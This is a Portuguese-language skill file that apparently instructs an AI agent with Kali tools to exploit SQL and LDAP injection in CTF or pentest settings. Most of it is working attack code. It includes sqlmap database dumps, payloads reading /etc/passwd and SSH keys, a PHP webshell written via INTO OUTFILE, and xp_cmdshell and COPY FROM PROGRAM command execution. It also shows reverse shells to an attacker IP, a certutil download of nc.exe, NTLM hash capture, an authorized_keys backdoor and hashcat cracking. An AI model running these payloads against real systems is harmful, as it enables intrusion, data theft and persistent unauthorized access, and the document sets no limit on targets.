---
name: ctf-sqli
description: Use esta skill quando o usuário quiser explorar SQL Injection em um CTF ou pentest, mencionar "sqli", "sql injection", "sqlmap", "injeção SQL", "blind injection", "database dump", "xp_cmdshell", "xp_dirtree", "MSSQL", "stacked queries", "gRPC SQLi", "WebSocket SQLi", "Grafana rawSql", "LDAP injection", ou tiver encontrado um endpoint vulnerável a injeção.
argument-hint: <url-ou-endpoint> [parâmetro-vulnerável]
allowed-tools: [mcp__mcp-kali-server__sqlmap_scan, mcp__mcp-kali-server__execute_command, mcp__mcp-kali-server__john_crack]
---

# CTF SQLi — SQL Injection & Injection Methodology

Esta skill implementa uma metodologia estruturada para testes de SQL Injection e outras injeções baseada em padrões de CTF e segurança.

## Informações necessárias

Se $ARGUMENTS contiver URL/endpoint, usar como alvo. Caso contrário, perguntar:
- "Qual é o endpoint vulnerável?"
- "Tem cookies/token de autenticação?"
- "Sabe qual banco de dados? (MySQL, MSSQL, PostgreSQL, SQLite, Oracle)"

## Passo 1 — Confirmar injeção

Use `execute_command` para teste manual:
```bash
# Teste básico
curl -s "<URL>?id=1'"
curl -s "<URL>?id=1' AND 1=1--"
curl -s "<URL>?id=1' AND 1=2--"  # resposta diferente = SQLi!

# Em headers
curl -H "User-Agent: 1'" http://target/
curl -H "X-Forwarded-For: 1'" http://target/
curl -H "Referer: 1'" http://target/

# LDAP injection
curl "http://target/users?name=*"          # retorna todos os usuários!
curl "http://target/users?name=admin)(%26"  # bypass de filtro
```

## Passo 2 — Automatizar com sqlmap

Use `sqlmap_scan`:

```bash
# GET básico
sqlmap -u "http://target/?id=1" --dbs --batch

# POST
sqlmap -u "http://target/login" --data="user=admin&pass=test" --dbs --batch

# Com cookie de autenticação
sqlmap -u "http://target/profile" --cookie="session=<TOKEN>" --dbs --batch

# Headers vulneráveis
sqlmap -u "http://target/" -H "X-Forwarded-For: *" --dbs --batch

# Stacked queries (MSSQL/PostgreSQL)
sqlmap -u "http://target/?id=1" --technique=S --batch

# Forçar DBMS específico
sqlmap -u "http://target/?id=1" --dbms=mssql --dbs --batch
```

### Enumeração completa:
```bash
sqlmap -u "<URL>" -D <database> --tables --batch
sqlmap -u "<URL>" -D <database> -T users --columns --batch
sqlmap -u "<URL>" -D <database> -T users -C username,password --dump --batch
```

## Passo 3 — SQL Injection por tipo de banco

### MySQL
```sql
-- Versão e usuário
' UNION SELECT 1,version(),user()--

-- Databases
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--

-- Ler arquivos locais (requer FILE privilege)
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--

-- Escrever webshell (requer write permission)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

### MSSQL — Enumeração e RCE

```sql
-- Verificar permissões
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT system_user

-- Habilitar xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--

-- xp_dirtree — explorar filesystem SEM xp_cmdshell
'; EXEC xp_dirtree 'C:\', 1, 1;--
'; EXEC xp_dirtree 'C:\Users\', 2, 1;--

-- xp_dirtree para forçar autenticação NTLM (capturar hash com Responder)
'; EXEC xp_dirtree '\\<KALI_IP>\share';--

-- Impersonation (HTB Freelancer — CRÍTICO)
SELECT * FROM sys.database_principals
-- Se user tem EXECUTE AS: EXECUTE AS LOGIN = 'sa'
'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

Use `execute_command` com mssqlclient.py para shell interativa:
```bash
mssqlclient.py <USER>:<PASS>@<TARGET_IP>
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
# No mssqlclient:
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
# SQL> xp_dirtree C:\Users\
```

### MSSQL — Linked Servers (HTB DarkZero)
```sql
-- Listar servidores linkados
SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1

-- Executar query no servidor linkado
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version')

-- RCE via linked server com xp_cmdshell
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME]

-- Verificar mapeamento de usuários (pode ter sysadmin no linked server!)
EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin
```

### PostgreSQL — RCE via COPY FROM PROGRAM

```sql
-- RCE (HTB Jupiter, Grafana)
CREATE TABLE cmd (output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1';

-- Ler arquivo
CREATE TABLE filedata (content text);
COPY filedata FROM '/etc/passwd';
SELECT * FROM filedata;
```

### Grafana — rawSql (HTB Jupiter, CVE-2019-9193)
```bash
# Endpoint não autenticado /api/ds/query com rawSql
curl -s -X POST "http://target:3000/api/ds/query" \
  -H "Content-Type: application/json" \
  -d '{"queries":[{"datasource":{"type":"postgres"},"rawSql":"SELECT version()","format":"table"}]}'

# RCE via PostgreSQL COPY FROM PROGRAM no rawSql
```

### SQLite
```sql
-- Listar tabelas
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master;

-- gRPC SQLi com SQLite (HTB PC)
-- Union injection com 3 colunas:
id: "1 union select sqlite_version(),2,3"
-- Concatenação: || operador
id: "1 union select group_concat(tbl_name),2,3 FROM sqlite_master"
```

## Passo 4 — Canais não tradicionais

### WebSocket SQL Injection (HTB Soccer)
```bash
# Via sqlmap
sqlmap -u "ws://<TARGET>:<PORT>/" \
  --data '{"id":"1234"}' \
  --dbms=sqlite --batch --level=5 --risk=3 \
  --technique=B  # boolean-based

# Manual com websocat
websocat "ws://<TARGET>:<PORT>" <<< '{"id":"1 OR 1=1--"}'
websocat "ws://<TARGET>:<PORT>" <<< '{"id":"1 UNION SELECT 1,2,3--"}'
```

### gRPC SQL Injection (HTB PC)
```bash
# Enumerar serviços
grpcurl -plaintext <TARGET>:<PORT> list
grpcurl -plaintext <TARGET>:<PORT> describe SimpleApp.LoginUser

# Injetar no campo id
grpcurl -plaintext -d '{"id":"1 union select 1,sqlite_version(),3"}' \
  <TARGET>:<PORT> SimpleApp/getInfo

# Extrair tabelas
grpcurl -plaintext -d '{"id":"1 union select group_concat(tbl_name),2,3 from sqlite_master"}' \
  <TARGET>:<PORT> SimpleApp/getInfo
```

### LDAP Injection (HTB Analysis, Lightweight)
```bash
# Wildcard bypass — retorna todos os usuários
curl "http://target/users?name=*"
curl "http://target/users?name=*)(%26(objectClass=*"

# Extrair atributos via injeção
# Injetar: admin)(&
# Isso cria: (&(sAMAccountName=admin)(&)(campoExtraAnteriormenteOculto=valor*))

# Enumerar campos de um usuário específico
# Payload: username)(fieldname=value*
curl "http://target/users?name=admin)(description=*"  # testa se description existe
curl "http://target/users?name=admin)(description=pass*"  # começa com "pass"?
```

## Passo 5 — Blind SQL Injection manual

### Boolean-based:
```bash
# Descobrir length do database
curl -s "<URL>?id=1' AND LENGTH(database())=5--"

# Extrair char por char (script Python)
python3 << 'EOF'
import requests, string
chars = string.ascii_lowercase + string.digits + '_-.'
target = "http://target/?id=1'"
result = ""
for i in range(1, 50):
    for c in chars:
        payload = f"AND SUBSTRING(database(),{i},1)='{c}'--"
        r = requests.get(target + payload)
        if "valid_indicator" in r.text:  # ajustar indicador
            result += c
            print(f"[+] {result}")
            break
    else:
        break
print(f"[*] Result: {result}")
EOF
```

### Time-based:
```sql
-- MySQL
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)--

-- MSSQL
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--

-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

Use `sqlmap_scan` com `--technique=T --time-sec=3` para automatizar.

## Passo 6 — Crack de hashes encontrados

Identificar tipo com:
```bash
hash-identifier "<HASH>"
hashcat --identify "<HASH>"
```

Use `john_crack` ou `execute_command` com hashcat:
```bash
hashcat -m 0    hashes.txt rockyou.txt  # MD5
hashcat -m 100  hashes.txt rockyou.txt  # SHA1
hashcat -m 1400 hashes.txt rockyou.txt  # SHA-256
hashcat -m 3200 hashes.txt rockyou.txt  # bcrypt
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 500  hashes.txt rockyou.txt  # MD5-crypt ($1$)
hashcat -m 1800 hashes.txt rockyou.txt  # SHA512crypt ($6$)
hashcat -m 0    hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Passo 7 — Post-exploitation via SQLi

```bash
# Ler arquivos chave (MySQL)
' UNION SELECT 1,load_file('/home/user/.ssh/id_rsa'),3--
' UNION SELECT 1,load_file('/var/www/html/.env'),3--

# Escrever SSH key autorizada
' UNION SELECT 1,'ssh-rsa AAAA...',3 INTO OUTFILE '/home/user/.ssh/authorized_keys'--

# MSSQL: reverse shell via xp_cmdshell
# Hospedar nc.exe no Kali e baixar no alvo:
'; EXEC xp_cmdshell 'certutil -urlcache -f http://<KALI>:8888/nc.exe C:\Windows\Temp\nc.exe';--
'; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <KALI_IP> 4444';--

# Usar credenciais encontradas
ssh <user>@<TARGET_IP>
evil-winrm -i <TARGET_IP> -u <user> -p <password>
netexec smb <TARGET_IP> -u <user> -p <password>
```

## Dicas do 0xdf

- **SQLi em headers**: User-Agent, X-Forwarded-For, Referer são frequentemente vulneráveis
- **Second-order SQLi**: dados salvos sem sanitização e executados depois (ex: username usado em query posterior)
- **MSSQL impersonation**: sempre checar `sys.database_principals` para permissões EXECUTE AS
- **xp_dirtree sem RCE**: explora filesystem e pode capturar hash NTLM via UNC path
- **sqlmap com proxy**: `--proxy=http://127.0.0.1:8080` para ver no Burp
- **CMS Made Simple blind SQLi**: ferramenta específica `cmsms_sqli.py` com cracking integrado
